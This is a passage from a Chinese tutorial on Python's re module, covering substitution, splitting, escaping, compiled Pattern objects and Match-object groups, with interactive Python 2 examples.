<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">444 (12, 15)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">简单的说吧，就是</span><span lang="EN-US"><span style="font-family:Times New Roman">finditer</span></span><span style="font-family:宋体">返回了一个可调用的对象，使用</span><span lang="EN-US"><span style="font-family:Times New Roman"> for i in finditer()</span></span><span style="font-family:宋体">的形式，可以一个一个的得到匹配返回的</span><span lang="EN-US"><span style="font-family:Times New Roman"> Match</span></span><span style="font-family:宋体">对象。这在对每次返回的对象进行比较复杂的操作时比较有用。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">2.4 </span></span><span style="font-family:宋体">字符串的替换和修改</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">模块还提供了对字符串的替换和修改函数，他们比字符串对象提供的函数功能要强大一些。这几个函数是</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">sub ( rule , replace , target [,count] )</span></span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">subn(rule , replace , target [,count] )</span></span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">在目标字符串中规格规则查找匹配的字符串，再把它们替换成指定的字符串。你可以指定一个最多替换次数，否则将替换所有的匹配到的字符串。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">第一个参数是正则规则，第二个参数是指定的用来替换的字符串，第三个参数是目标字符串，第四个参数是最多替换次数。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">这两个函数的唯一区别是返回值。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">sub</span></span><span style="font-family:宋体">返回一个被替换的字符串</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">sub</span></span><span style="font-family:宋体">返回一个元组，第一个元素是被替换的字符串，第二个元素是一个数字，表明产生了多少次替换。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">例，将下面字符串中的</span><span lang="EN-US"><span style="font-family:Times New Roman">’dog’</span></span><span style="font-family:宋体">全部替换成</span><span lang="EN-US"><span style="font-family:Times New Roman">’cat’</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s=’ I have a dog , you have a dog , he have a dog ‘</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.sub( r’dog’ , ‘cat’ , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">' I have a cat , you have a cat , he have a cat '</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">如果我们只想替换前面两个，则</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.sub( r’dog’ , ‘cat’ , s , 2 )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">' I have a cat , you have a cat , he have a dog '</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">或者我们想知道发生了多少次替换，则可以使用</span><span lang="EN-US"><span style="font-family:Times New Roman">subn</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.subn( r’dog’ , ‘cat’ , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">(' I have a cat , you have a cat , he have a cat ', 3)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">split( rule , target [,maxsplit] )</span></span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">切片函数。使用指定的正则规则在目标字符串中查找匹配的字符串，用它们作为分界，把字符串切片。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">第一个参数是正则规则，第二个参数是目标字符串，第三个参数是最多切片次数</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">返回一个被切完的子字符串的列表</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">这个函数和</span><span lang="EN-US"><span style="font-family:Times New Roman">str</span></span><span style="font-family:宋体">对象提供的</span><span lang="EN-US"><span style="font-family:Times New Roman">split</span></span><span style="font-family:宋体">函数很相似。举个例子，我们想把上例中的字符串被</span><span lang="EN-US"><span style="font-family:Times New Roman">’,’</span></span><span style="font-family:宋体">分割开，同时要去掉逗号前后的空格</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s=’ I have a dog<span style="">   </span>,<span style="">   </span>you have a dog<span style="">  </span>,<span style="">  </span>he have a dog ‘</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.split( ‘\s*,\s*’ , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">[' I have a dog', 'you have a dog', 'he have a dog ']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">结果很好。如果使用</span><span lang="EN-US"><span style="font-family:Times New Roman">str</span></span><span style="font-family:宋体">对象的</span><span lang="EN-US"><span style="font-family:Times New Roman">split</span></span><span style="font-family:宋体">函数，则由于我们不知道</span><span lang="EN-US"><span style="font-family:Times New Roman">’,’</span></span><span style="font-family:宋体">两边会有多少个空格，而不得不对结果再进行一次处理。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">escape( string )</span></span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">这是个功能比较古怪的函数，它的作用是将字符串中的</span><span lang="EN-US"><span style="font-family:Times New Roman">non-alphanumerics</span></span><span style="font-family:宋体">字符（我已不知道该怎么翻译比较好了）用反义字符的形式显示出来。有时候你可能希望在正则式中匹配一个字符串，不过里面含有很多</span><span lang="EN-US"><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">使用的符号，你要一个一个的修改写法实在有点麻烦，你可以使用这个函数</span><span lang="EN-US"><span style="font-family:Times New Roman">, </span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">例</span><span style="font-family:Times New Roman"> </span><span style="font-family:宋体">在目标字符串</span><span lang="EN-US"><span style="font-family:Times New Roman">s</span></span><span style="font-family:宋体">中匹配</span><span lang="EN-US"><span style="font-family:Times New Roman">’(*+?)’</span></span><span style="font-family:宋体">这个子字符串</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">&gt;&gt;&gt; s= ‘111 222 (*+?) 333’</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; rule= re.escape( r’(*+?)’ )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; print rule</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">\(\*\+\?\)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall( rule , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['(*+?)']</span></span></p> &lt;FONT style="FONT-SIZE: 10.5pt" face="""&gt; 
<br style="page-break-before:always"> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">3<span style="">     </span></span></span><strong style=""><span style="font-family:宋体">更深入的了解</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">的组与对象</span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">前面对</span><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">正则式的组进行了一些简单的介绍，由于还没有介绍到</span><span lang="EN-US"><span style="font-family:Times New Roman">match</span></span><span style="font-family:宋体">对象，而组又是和</span><span lang="EN-US"><span style="font-family:Times New Roman">match</span></span><span style="font-family:宋体">对象密切相关的，所以必须将它们结合起来介绍才能充分地说明它们的用途。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">不过再详细介绍它们之前，我觉得有必要先介绍一下将规则编译后的生成的</span><span lang="EN-US"><span style="font-family:Times New Roman">patter</span></span><span style="font-family:宋体">对象</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">3.1</span></span><span style="font-family:宋体">编译后的</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">Pattern</span></span><span style="font-family:宋体">对象</span><span lang="EN-US" style=""></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">将一个正则式，使用</span><span lang="EN-US"><span style="font-family:Times New Roman">compile</span></span><span style="font-family:宋体">函数编译，不仅是为了提高匹配的速度，同时还能使用一些附加的功能。编译后的结果生成一个</span><span lang="EN-US"><span style="font-family:Times New Roman">Pattern</span></span><span style="font-family:宋体">对象，这个对象里面有很多函数，他们看起来和</span><span lang="EN-US"><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">模块的函数非常象，它同样有</span><span lang="EN-US"><span style="font-family:Times New Roman">findall , match , search ,finditer , sub , subn , split </span></span><span style="font-family:宋体">这些函数，只不过它们的参数有些小小的不同。一般说来，</span><span lang="EN-US"><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">模块函数的第一个参数，即正则规则不再需要了，应为规则就包含在</span><span lang="EN-US"><span style="font-family:Times New Roman">Pattern</span></span><span style="font-family:宋体">对象中了，编译选项也不再需要了，因为已经被编译过了。因此</span><span lang="EN-US"><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">模块中函数的这两个参数的位置，就被后面的参数取代了。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">findall , match , search </span></span><span style="font-family:宋体">和</span><span lang="EN-US"><span style="font-family:Times New Roman">finditer</span></span><span style="font-family:宋体">这几个函数的参数是一样的，除了少了规则和选项两个参数外，它们又加入了另外两个参数，它们是：查找开始位置和查找结束位置，也就是说，现在你可以指定查找的区间，除去你不感兴趣的区间。它们现在的参数形式是：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">findall ( targetString [, startPos [,endPos] ] )</span></span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">finditer ( targetString [, startPos [,endPos] ] )</span></span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">match ( targetString [, startPos [,endPos] ] )</span></span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">search ( targetString [, startPos [,endPos] ] )</span></span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">这些函数的使用和</span><span lang="EN-US"><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">模块的同名函数使用完全一样。所以就不多介绍了。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">除了和</span><span lang="EN-US"><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">模块的函数同样的函数外，</span><span lang="EN-US"><span style="font-family:Times New Roman">Pattern</span></span><span style="font-family:宋体">对象还多了些东西，它们是：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">flags<span style="">       </span></span></span><span style="font-family:宋体">查询编译时的选项</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">pattern </span></span><span style="font-family:宋体">查询编译时的规则</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">groupindex </span></span><span style="font-family:宋体">规则里的组</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">这几个不是函数，而是一个值。它们提供你一些规则的信息。比如下面这个例子</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; p=re.compile( r'(?P&lt;word&gt;\b[a-z]+\b)|(?P&lt;num&gt;\b\d+\b)|(?P&lt;id&gt;\b[a-z_]+\w*\b)' , re.I )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; p.flags</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">2</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; p.pattern</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">'(?P&lt;word&gt;\\b[a-z]+\\b)|(?P&lt;num&gt;\\b\\d+\\b)|(?P&lt;id&gt;\\b[a-z_]+\\w*\\b)'</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; p.groupindex</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">{'num': 2, 'word': 1, 'id': 3}</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">我们来分析一下这个例子：这个正则式是匹配单词、或数字、或一个由字母或</span><span lang="EN-US"><span style="font-family:Times New Roman">’_’</span></span><span style="font-family:宋体">开头，后面接字母或数字的一个</span><span lang="EN-US"><span style="font-family:Times New Roman">ID</span></span><span style="font-family:宋体">。我们给这三种情况的规则都包入了一个命名组，分别命名为</span><span lang="EN-US"><span style="font-family:Times New Roman">’word’ , ‘num’ </span></span><span style="font-family:宋体">和</span><span style="font-family:Times New Roman"> <span lang="EN-US">‘id’</span></span><span style="font-family:宋体">。我们规定大小写不敏感，所以使用了编译选项</span><span style="font-family:Times New Roman"> <span lang="EN-US">‘I’</span></span><span style="font-family:宋体">。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">编译以后返回的对象为</span><span lang="EN-US"><span style="font-family:Times New Roman">p</span></span><span style="font-family:宋体">，通过</span><span lang="EN-US"><span style="font-family:Times New Roman">p.flag</span></span><span style="font-family:宋体">我们可以查看编译时的选项，不过它显示的不是</span><span lang="EN-US"><span style="font-family:Times New Roman">’I’</span></span><span style="font-family:宋体">，而是一个数值</span><span lang="EN-US"><span style="font-family:Times New Roman">2 </span></span><span style="font-family:宋体">。其实</span><span lang="EN-US"><span style="font-family:Times New Roman">re.I</span></span><span style="font-family:宋体">是一个整数，</span><span lang="EN-US"><span style="font-family:Times New Roman">2</span></span><span style="font-family:宋体">就是它的值。我们可以查看一下：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.I</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">2</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.L</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">4</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.M</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">8</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">…</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">每个选项都是一个数值。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">通过</span><span lang="EN-US"><span style="font-family:Times New Roman">p.pattern</span></span><span style="font-family:宋体">可以查看被编译的规则是什么。使用</span><span lang="EN-US"><span style="font-family:Times New Roman">print</span></span><span style="font-family:宋体">的话会更好看一些</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; print p.pattern</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">(?P&lt;word&gt;\b[a-z]+\b)|(?P&lt;num&gt;\b\d+\b)|(?P&lt;id&gt;\b[a-z_]+\w*\b)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">看，和我们输入的一样。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">接下来的</span><span lang="EN-US"><span style="font-family:Times New Roman">p.groupindex</span></span><span style="font-family:宋体">则是一个字典，它包含了规则中的所有命名组。字典的</span><span lang="EN-US"><span style="font-family:Times New Roman">key</span></span><span style="font-family:宋体">是名字，</span><span lang="EN-US"><span style="font-family:Times New Roman">values</span></span><span style="font-family:宋体">是组的序号。由于字典是以名字作为</span><span lang="EN-US"><span style="font-family:Times New Roman">key</span></span><span style="font-family:宋体">，所以一个无命名的组不会出现在这里。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">3.2 </span></span><span style="font-family:宋体">组与</span><span lang="EN-US"><span style="font-family:Times New Roman">Match</span></span><span style="font-family:宋体">对象</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">组与</span><span lang="EN-US"><span style="font-family:Times New Roman">Match</span></span><span style="font-family:宋体">对象是</span><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">正则式的重点。只有掌握了组和</span><span lang="EN-US"><span style="font-family:Times New Roman">Match</span></span><span style="font-family:宋体">对象的使用，才算是真正学会了</span><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">正则式。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:Times New Roman"><strong style=""><span lang="EN-US">3.2.1</span></strong><strong style=""><span lang="EN-US"> </span></strong></span><strong style=""><span style="font-family:宋体">组的名字与序号</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">正则式中的每个组都有一个序号，它是按定义时从左到右的顺序从</span><span lang="EN-US"><span style="font-family:Times New Roman">1</span></span><span style="font-family:宋体">开始编号的。其实，</span><span lang="EN-US"><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">的正则式还有一个</span><span lang="EN-US"><span style="font-family:Times New Roman">0</span></span><span style="font-family:宋体">号组，它就是整个正则式本身。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">我们来看个例子</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; p=re.compile( r’(?P&lt;name&gt;[a-z]+)\s+(?P&lt;age&gt;\d+)\s+(?P&lt;tel&gt;\d+).*’ , re.I )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; p.groupindex</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">{'age': 2, 'tel': 3, 'name': 1}</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s=’Tom 24 88888888<span style="">  </span>&lt;=’</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; m=p.search(s)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; m.groups()<span style="">                           </span># </span></span><span style="font-family:宋体">看看匹配的各组的情况</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">('Tom', '24', '8888888')</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; m.group(‘name’)<span style="">                   </span># </span></span><span style="font-family:宋体">使用组名获取匹配的字符串</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">‘Tom’</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; m.group( 1 )<span style="">                         </span># </span></span><span style="font-family:宋体">使用组序号获取匹配的字符串，同使用组名的效果一样</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; m.group(0)<span style="">                           </span># 0 </span></span><span style="font-family:宋体">组里面是什么呢？</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">'Tom 24 88888888<span style="">  </span>&lt;='</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">原来</span><span lang="EN-US"><span style="font-family:Times New Roman">0</span></span><span style="font-family:宋体">组就是整个正则式</span><span lang="EN-US"><span style="font-family:Times New Roman">,</span></span><span style="font-family:宋体">包括没有被包围到组里面的内容。当获取</span><span lang="EN-US"><span style="font-family:Times New Roman">0</span></span><span style="font-family:宋体">组的时候，你可以不写这个参数。</span><span lang="EN-US"><span style="font-family:Times New Roman">m.group(0)</span></span><span style="font-family:宋体">和</span><span lang="EN-US"><span style="font-family:Times New Roman">m.group()</span></span><span style="font-family:宋体">的效果是一样的：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; m.group()</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">'Tom 24 88888888<span style="">  </span>&lt;='</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">接下来看看更多的</span><span lang="EN-US"><span style="font-family:Times New Roman">Match</span></span><span style="font-family:宋体">对象的方法，看看我们能做些什么。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:Times New Roman"><strong style=""><span lang="EN-US">3.2.2</span></strong><strong style=""><span lang="EN-US"> Match</span></strong></span><strong style=""><span style="font-family:宋体">对象的方法</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:Times New Roman"><strong style=""><span lang="EN-US">group([index|id])</span></strong><span lang="EN-US"> </span></span><span style="font-family:宋体">获取匹配的组，缺省返回组</span><span lang="EN-US"><span style="font-family:Times New Roman">0,</span></span><span style="font-family:宋体">也就是全部值</span></span></p> 
